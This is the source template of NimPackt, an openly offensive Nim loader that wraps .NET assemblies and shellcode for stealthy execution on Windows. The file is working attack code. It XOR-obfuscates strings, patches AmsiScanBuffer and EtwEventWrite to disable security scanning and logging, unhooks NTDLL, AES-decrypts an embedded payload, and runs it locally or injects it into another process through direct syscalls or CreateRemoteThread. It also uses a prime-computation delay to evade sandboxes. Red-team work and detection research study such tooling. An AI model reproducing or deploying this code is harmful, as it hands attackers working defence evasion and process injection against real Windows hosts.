#[
    NimPackt - a Nim-Based C# (.NET) binary executable wrapper for OpSec & Profit
    By Cas van Cooten (@chvancooten)

    This is a template file. For usage please refer to README.md

    ===
    
    References:

        Based on OffensiveNim by Marcello Salvati (@byt3bl33d3r)
        https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
        https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_amsiPatch_bin.nim

        Also inspired by the below post by Fabian Mosch (@S3cur3Th1sSh1t)
        https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/

        Direct syscalls implemented using NimlineWhispers by Alfie Champion (@ajpc500)
        https://github.com/ajpc500/NimlineWhispers

]#

import nimcrypto
import winim/lean
import os
import dynlib
import base64
import osproc
import math
from bitops import bitor

when defined remoteShinject:
    import winim/com

when defined executeAssembly:
    import winim/clr except `[]`

when defined syscalls:
    include ../templates/syscalls
    from winlean import getCurrentProcess

### Modified code from Nim-Strenc to avoid XORing of long strings
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro obf*(s: untyped): untyped =
    if len($s) < 1000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
    else:
        result = s

func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

# BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: const cryptKey: array[16, byte] = [byte 0x50,0x61,0x4e, ...]
#[ PLACEHOLDERCRYPTKEY ]#
var tProcId : DWORD

when defined calcPrimes:
    proc cPrim(seconds: int): int {.noinline.} =
        var finalPrime: int = 0
        var max: int = seconds * 68500

        when defined verbose:
            echo obf("[*] Sleeping for approx. "), time, obf(" seconds")

        for n in countup(2, max):
            var ok: bool = true
            var i: int = 2

            while i.float <= sqrt(n.float):
                if (n mod i == 0):
                    ok = false
                inc(i)

            if n <= 1:
                ok = false
            elif n == 2:
                ok = true
            if ok == true:
                finalPrime = n

        return finalPrime

when defined patchAmsi:
    proc pAms(): bool =
        # Get the AMSI patch bytes based on arch
        when defined amd64:
            when defined verbose:
                echo obf("[*] Running in x64 process")
            let aPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
        elif defined i386:
            when defined verbose:
                echo obf("[*] Running in x86 process")
            let aPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

        var
            amsi: LibHandle
            disabled: bool = false
            sbAddr: pointer

        amsi = loadLib(obf("amsi"))
        if isNil(amsi):
            when defined verbose:
                echo obf("[X] Failed to load amsi.dll")
            return disabled

        sbAddr = amsi.symAddr(obf("AmsiScanBuffer"))
        
        if isNil(sbAddr):
            when defined verbose:
                echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
            return disabled

        when defined syscalls:          
            # NtProtectVirtualMemory
            var op: ULONG
            var pLen = cast[SIZE_T](aPatch.len)
            var sbPageAddr = sbAddr
            var ret = OWMMatfEEuAkFGyd(getCurrentProcess(), &sbPageAddr, &pLen, PAGE_EXECUTE_READWRITE, &op)
            doAssert ret == 0, obf("Error executing NtProtectVirtualMemory when setting AMSI protections.")

            # NtWriteVirtualMemory
            var bytesWritten: SIZE_T
            ret = eodmammwgdehtZKC(getCurrentProcess(), sbAddr, unsafeAddr aPatch, aPatch.len, addr bytesWritten)
            doAssert ret == 0, obf("Error executing NtWriteVirtualMemory.")
            
            # NtProtectVirtualMemory
            var t: ULONG
            ret = OWMMatfEEuAkFGyd(getCurrentProcess(), &sbPageAddr, &pLen, op, &t)
            doAssert ret == 0, obf("Error executing NtProtectVirtualMemory when restoring AMSI protections.")

            disabled = true
        else:
            var op: DWORD
            var t: DWORD
            if VirtualProtect(sbAddr, aPatch.len, PAGE_EXECUTE_READWRITE, addr op):
                copyMem(sbAddr, unsafeAddr aPatch, aPatch.len)
                VirtualProtect(sbAddr, aPatch.len, op, addr t)
                disabled = true

        return disabled

when defined disableEtw:
    when defined amd64:
        const patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    proc dEtw(): bool =
        var
            ntdll: LibHandle
            cs: pointer
            op: DWORD
            t: DWORD
            disabled: bool = false

        ntdll = loadLib(obf("ntdll"))
        if isNil(ntdll):
            return disabled

        cs = ntdll.symAddr(obf("EtwEventWrite")) # equivalent of GetProcAddress()
        if isNil(cs):
            return disabled

        if VirtualProtect(cs, patch.len, 0x40, addr op):
            echo obf("[*] Applying patch")
            copyMem(cs, unsafeAddr patch, patch.len)
            VirtualProtect(cs, patch.len, op, addr t)
            disabled = true

        return disabled
           
when defined patchApiCalls:
    # Decrypt Shellycoat shellcode
    proc dCryptApiC(cryptedCoat: string, key: array[16, byte], iv: array[16, byte]): seq[byte] =
        let cryptedCoatBytes = toByteSeq(decode(cryptedCoat))
        var
            encodedCoat = newSeq[byte](len(cryptedCoatBytes))
            decodedCoat = newSeq[byte](len(cryptedCoatBytes))
            
        encodedCoat = cryptedCoatBytes
        var dctx: CTR[aes128]
        dctx.init(key, iv)
        dctx.decrypt(encodedCoat, decodedCoat)
        dctx.clear()

        return decodedCoat

when defined executeAssembly:
    proc execAsm(decodedPay: openArray[byte]): void =
        var assembly = load(decodedPay)

        # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: let arr = toCLRVariant([obf("argument1"), obf("argument2")], VT_BSTR)
        #[ PLACEHOLDERARGUMENTS ]#

        when defined verbose:
            echo obf("[*] Executing assembly...")
            
        assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

when defined(shinject) or defined(patchApiCalls):
    when defined syscalls:
        # Run shellcode using direct syscalls for low-level APIs
        proc rSc(payload: openArray[byte]): void =
            # NtAllocateVirtualMemory
            var sc_size: SIZE_T = cast[SIZE_T](payload.len)
            var dest: LPVOID
            var ret = nWEpirsdHAHLmkkz(getCurrentProcess(), &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
            doAssert ret == 0, obf("Error executing NtAllocateVirtualMemory.")

            # NtWriteVirtualMemory
            var bytesWritten: SIZE_T
            ret = eodmammwgdehtZKC(getCurrentProcess(), dest, unsafeAddr payload, sc_size-1, addr bytesWritten)
            doAssert ret == 0, obf("Error executing NtWriteVirtualMemory.")

            when defined verbose:
                echo obf("[*] NtWriteVirtualMemory: "), ret
                echo obf("    \\-- bytes written: "), bytesWritten
            
            let f = cast[proc(){.nimcall.}](dest)
            f()
    else:
        # Run shellcode using VirtualProtect()
        proc rSc(payload: openArray[byte]): void =
            var oldProtect : DWORD
            var ret = VirtualProtect(payload.unsafeAddr, len(payload), PAGE_EXECUTE_READWRITE, oldProtect.addr)
            doAssert ret != 0, obf("Error executing VirtualProtect()")
            let f = cast[proc(){.nimcall.}](payload.unsafeAddr)
            f()

when defined remoteShinject:
    when defined syscalls:
        # Remote shellcode injection using syscalls
        proc iSR(payload: openArray[byte], tProcId: int): void =
            var rcid: CLIENT_ID
            rcid.UniqueProcess = cast[DWORD](tProcId)

            # NtOpenProcess, get handle on remote process
            var rHandle: HANDLE
            var roa: OBJECT_ATTRIBUTES
            var ret = GALPYIdGzuLQOpTx(&rHandle, PROCESS_ALL_ACCESS, &roa, &rcid)
            doAssert ret == 0, obf("Error executing NtOpenProcess (remote).")
            when defined verbose:
                echo obf("[*] rHandle: "), rHandle

            # NtAllocateVirtualMemory, allocate memory in remote thread
            var rBaseAddr: LPVOID
            var sc_size: SIZE_T = cast[SIZE_T](payload.len)
            ret = nWEpirsdHAHLmkkz(rHandle, &rBaseAddr, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            doAssert ret == 0, obf("Error executing NtAllocateVirtualMemory.")

            # NtWriteVirtualMemory, write payload to remote thread
            var bytesWritten: SIZE_T
            ret = eodmammwgdehtZKC(rHandle, rBaseAddr, unsafeAddr payload, sc_size-1, addr bytesWritten);
            doAssert ret == 0, obf("Error executing NtWriteVirtualMemory.")
            when defined verbose:
                echo obf("[*] NtWriteVirtualMemory: "), ret
                echo obf("    \\-- bytes written: "), bytesWritten

            # NtCreateThreadEx, execute shellcode from memory region in remote thread
            var tHandle: HANDLE
            ret = MrvSSHuatQxosGly(&tHandle, THREAD_ALL_ACCESS, NULL, rHandle, rBaseAddr, NULL, FALSE, 0, 0, 0, NULL)
            doAssert ret == 0, obf("Error executing NtCreateThreadEx.")

            # NtClose, close the handle
            ret = pCsHHYfYZhNuUXYy(rHandle)
            doAssert ret == 0, obf("Error executing NtClose (rHandle).")
            ret = pCsHHYfYZhNuUXYy(tHandle)
            doAssert ret == 0, obf("Error executing NtClose (tHandle).")
    else:
        # Remote shellcode injection using high-level APIs
        proc iSR(payload: openArray[byte], tProcId: int): void =
            let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcId))
            defer: CloseHandle(pHandle)
            when defined verbose:
                echo obf("[*] pHandle: "), pHandle

            let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](payload.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)

            var bytesWritten: SIZE_T
            let wSuccess = WriteProcessMemory(pHandle, rPtr, unsafeAddr payload, cast[SIZE_T](payload.len), addr bytesWritten)
            when defined verbose:
                echo obf("[*] WriteProcessMemory: "), bool(wSuccess)
                echo obf("    \\-- bytes written: "), bytesWritten

            var tHandle : HANDLE
            tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, NULL, NULL)
            defer: CloseHandle(tHandle)
            when defined verbose:
                echo obf("[*] tHandle: "), tHandle
                echo obf("[+] Injected")

    proc rShI(decodedPay: openArray[byte]) : void =
        # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: var tProc: string = obf("explorer.exe")
        #[ PLACEHOLDERTARGETPROC ]#
        # BELOW LINE WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE: var nProc: bool = true
        #[ PLACEHOLDERNEWPROC ]#

        if tProcId == 0:
            if nProc == false:
                # Inject in existing process, get first PID with the specified name
                when defined verbose:
                    echo obf("[*] Targeting existing process...")
                let wmi = GetObject(robf("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2"))
                for process in wmi.execQuery(obf("SELECT * FROM win32_process")):
                    if process.name == tProc:
                        tProcId = process.handle
            else:
                # Inject in new process, launch new process with specified name and get PID
                when defined verbose:
                    echo obf("[*] Targeting new process...")
                let tProcess = startProcess(tProc)
                tProcess.suspend() 
                defer: tProcess.close()
                tProcId = cast[DWORD](tProcess.processID)

        when defined verbose:
            echo obf("[*] Target Process: "), tProc, obf(" ["), tProcId, obf("]")

        iSR(decodedPay, tProcId)

proc theMainFunction() : void =

    #[
        BELOW LINES WILL BE REPLACED BY WRAPPER SCRIPT || EXAMPLE:
        let b64buf = obf("ZXhhbXBsZQo=")
        let cryptedCoat = obf("")
        let cryptIV: array[16, byte] = [byte 0x11,0x65,0xde,0x9f,0xfe,0xc9,0x15,0x33,0x6e,0x0a,0x8a,0x2e,0x4a,0x2d,0xff,0xb7]

        (key is defined separately as a const to prevent the values from being too close together)
    ]#
    #[ PLACEHOLDERCRYPTEDINPUT ]#
    #[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#
    #[ PLACEHOLDERCRYPTIV ]#

    when defined calcPrimes:
        discard cPrim(30)

    # Prepare decryption stuff
    let cryptedInput = toByteSeq(decode(b64buf))
    
    var
        key : array[aes128.sizeKey, byte]
        iv : array[aes128.sizeBlock, byte]
        encodedPay = newSeq[byte](len(cryptedInput))
        decodedPay = newSeq[byte](len(cryptedInput))

    key = cryptKey
    iv = cryptIV
    encodedPay = cryptedInput

    when defined patchApiCalls:
        var sCoat = dCryptApiC(cryptedCoat, key, iv)
            
    # Decrypt the encrypted bytes of the main payload
    var dctx2: CTR[aes128]
    dctx2.init(key, iv)
    dctx2.decrypt(encodedPay, decodedPay)
    dctx2.clear()

    when defined executeAssembly:
        var success : bool
        when defined patchAmsi:
            # Patch AMSI
            success = pAms()
            when defined verbose:
                echo obf("[*] AMSI disabled: "), success

        when defined disableEtw:
            # Disable ETW
            success = dEtw()
            when defined verbose:
                echo obf("[*] ETW disabled: "), success

        when defined patchApiCalls:
            when defined verbose:
                echo obf("[*] Executing shellycoat in local thread to unhook NTDLL...")
            rSc(sCoat)

        execAsm(decodedPay)

    when defined shinject:
        when defined patchApiCalls:
            when defined verbose:
                echo obf("[*] Executing shellycoat in local thread to unhook NTDLL...")
            rSc(sCoat)
        when defined verbose:
            echo obf("[*] Executing shellcode in local thread...")
        rSc(decodedPay)

    when defined remoteShinject:
        when defined patchApiCalls:
            when defined verbose:
                echo obf("[*] Executing shellycoat in remote thread to unhook NTDLL...")
            rShI(sCoat)
        when defined verbose:
            echo obf("[*] Executing shellcode in remote thread...")
        rShI(decodedPay)

when defined exportExe:
    when isMainModule:
        theMainFunction()

when defined exportDll:
    proc NimMain() {.cdecl, importc.}

    proc Update(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
        NimMain()
        theMainFunction()
        return true
